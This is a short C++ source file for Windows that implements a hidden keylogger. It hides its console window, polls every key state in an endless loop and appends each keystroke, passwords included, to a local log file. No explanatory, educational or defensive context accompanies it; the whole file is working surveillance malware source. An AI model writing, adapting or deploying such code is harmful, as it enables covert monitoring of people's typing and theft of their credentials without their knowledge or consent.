#include <windows.h>
#include <fstream>
#include <iostream>

void LogKey(int key) {
    std::ofstream log("log.txt", std::ios::app);
    if (key == VK_SPACE) log << " ";
    else if (key == VK_RETURN) log << "[ENTER]\n";
    else if (key == VK_BACK) log << "[BACKSPACE]";
    else log << char(key);
    log.close();
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE); // Hide window
    while (true) {
        Sleep(10);
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                LogKey(key);
            }
        }
    }
    return 0;
}   